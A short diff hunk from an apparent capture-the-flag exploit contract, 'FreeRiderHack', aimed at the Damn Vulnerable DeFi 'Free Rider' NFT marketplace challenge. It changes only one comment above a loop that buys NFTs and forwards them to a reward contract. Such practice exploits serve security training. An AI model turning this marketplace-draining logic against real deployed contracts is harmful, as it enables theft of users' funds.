@@ -73,7 +73,7 @@ contract FreeRiderHack is ERC721Holder {
         mktplace.buyMany{value: wethAmount}(tokens);
         nft = DamnValuableNFT(mktplace.token());
 
-        //send all nfts to reward contract
+        //send all nfts to reward contract, with data of who to send eth
         for (uint i = 0; i < tokenCount; i++) {
             nft.safeTransferFrom(
                 address(this),
